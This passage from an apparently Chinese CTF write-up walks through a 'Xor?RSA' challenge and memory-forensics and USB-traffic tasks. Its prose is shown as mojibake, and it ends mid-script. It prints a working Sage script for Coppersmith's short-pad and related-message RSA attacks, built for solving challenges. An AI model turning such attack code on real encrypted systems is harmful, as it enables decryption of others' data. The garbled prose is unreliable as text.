src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>è¿™è™½ç„¶ä¸æ˜¯æœ€ç²¾ç¡®çš„æ–¹æ³•ï¼Œä½†å¯ä»¥è¯´æ˜¯ç®€ä¾¿é«˜æ•ˆäº†ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡xortoolæ¥çˆ†ç ´keyçš„é•¿åº¦ï¼Œä»¥åŠå¯èƒ½çš„å­—ç¬¦ä¸²ã€‚æˆ–è€…æŸ¥çœ‹<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">æ±‰æ˜ç åŸç†</a>ã€‚</p><p>é€šè¿‡xortoolç¬é—´å¾—åˆ°keyé•¿åº¦æœ€å¯èƒ½ä¸º21ï¼ˆè®°å¾—å¯†æ–‡éœ€è¦æ˜¯base64è§£å¯†åçš„çœŸæ­£å†…å®¹ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>çš„ç¡®å¯ä»¥çœ‹åˆ°çˆ†ç ´å‡ºæ¥çš„keyå¤§å¤šæ•°ä¸æˆå½¢ï¼Œæ¯”è¾ƒéš¾çŒœå‡ºï¼Œä¸è¿‡å¾—åˆ°äº†keyçš„é•¿åº¦å°±æ¯”è¾ƒç®€å•äº†ã€‚</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>è¿™é¢˜æ¶‰åŠåˆ°RSAçš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼špaddingè¿‡çŸ­ï¼Œå¯ä»¥åˆ©ç”¨Coppersmithâ€™s short-pad attackã€‚</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTFä¸­RSAå¸¸è§æ”»å‡»æ–¹æ³•</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">æµ…æRSA Padding Attack-ä¸€å¶é£˜é›¶</a></p><p>é¢˜ç›®æºç ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>è¿™ç§ç›®å‰æ¯”è¾ƒå¸¸è§çš„å¯†ç å­¦å‡ºé¢˜æ–¹å¼ï¼Œä¹‹å‰ä¸Šæµ·ç¬¬å››å±Šå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›ä¸­ä¹Ÿæ˜¯ç±»ä¼¼çš„å½¢å¼ã€‚</p><p>æ ¹æ®ç½‘ä¸ŠCoppersmithâ€™s short-pad attackçš„sageè„šæœ¬è®¡ç®—å¾—åˆ°m1,m2ä»è€Œgetflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sageæ–‡ä»¶</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sageç¯å¢ƒå¯ä»¥è‡ªå·±å®‰è£…ï¼Œä¹Ÿå¯ä»¥åœ¨çº¿è¿è¡Œï¼š<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>è¿™å‡ é“miscæ„Ÿè§‰ä¹Ÿå§¿åŠ¿æ»¡æ»¡å‘¢ã€‚æ¯”å¦‚å†…å­˜å–è¯ï¼Œusbæµé‡åˆ†æã€‚</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>é¦–å…ˆéœ€è¦çŸ¥é“è¿™æ˜¯ä¸€ä¸ªé•œåƒæ–‡ä»¶ï¼Œè€Œkaliä¸‹é¢çš„volatilityå¯ä»¥è¿›è¡Œå†…å­˜å–è¯ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTFå†…å­˜å–è¯</a></p><p>æ‰§è¡Œå‘½ä»¤<code>volatility -f mem.data imageinfo</code>å¯ä»¥çœ‹åˆ°é•œåƒä¿¡æ¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>æŸ¥çœ‹è¿›ç¨‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" class="lazyload"></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump å‡ºçš„æ–‡ä»¶ä¿å­˜çš„ç›®å½•]**</code>å¯¼å‡ºæŒ‡å®šè¿›ç¨‹æ•°æ®ï¼š</p><p>gimpå¯ä»¥è¯»å–.dataæ–‡ä»¶ï¼Œä»åŸå§‹æ•°æ®ä¸­è½½å…¥å›¾åƒï¼ˆéœ€è¦æ³¨æ„è°ƒæ•´çš„æ˜¯å®½åº¦ï¼Œè¿™ä¸ªæœ€é‡è¦ï¼Œå½“å®½åº¦ä¸º1457æ—¶æœ€æ¥è¿‘åŸå›¾ï¼Œç„¶åè¶Šå¤§å°±è¶Šä¸å®¹æ˜“æ‰¾åˆ°ï¼‰ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" class="lazyload"></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>é€šè¿‡æå–å¹¶ä¸”è§£å¯†usbæµé‡å¯ä»¥å¾—åˆ°ä¸€æ®µ malbolge çš„ä»£ç ï¼Œä¹‹å‰åœ¨ä¸­ç§‘å¤§æ ¡èµ›ä¸Šé¢ä¹Ÿåšè¿‡ğŸ˜„ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" class="lazyload"></p><p>ç„¶åå¯ä»¥googleä¸Šé¢æœä¸ªç¼–è¯‘å™¨è¿è¡Œä¸€ä¸‹ï¼Œä¸åŒçš„ç¼–è¯‘å™¨æ•ˆæœå¯èƒ½ä¸ä¸€æ ·ï¼Œæœ‰å¯èƒ½è¿™ä¸ªç¼–è¯‘å™¨æœ‰ç”¨ï¼Œå¦å¤–ä¸€ä¸ªæ²¡ç”¨ã€‚ã€‚</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token 